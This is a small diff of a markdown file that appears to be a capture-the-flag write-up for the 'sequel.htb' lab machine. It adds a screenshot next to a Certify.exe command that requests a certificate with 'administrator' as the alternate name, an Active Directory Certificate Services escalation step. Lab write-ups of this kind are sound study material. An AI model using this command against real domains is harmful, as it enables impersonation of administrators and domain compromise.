@@ -74,6 +74,8 @@ upload Certify.exe
 ```
 ![image](https://github.com/user-attachments/assets/291c9e18-5898-42e1-af69-1827741ff159)
 
+![image](https://github.com/user-attachments/assets/982539d6-95a6-4b91-8d6a-9c1b6c695ca4)
+
 ```
 .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
 ```
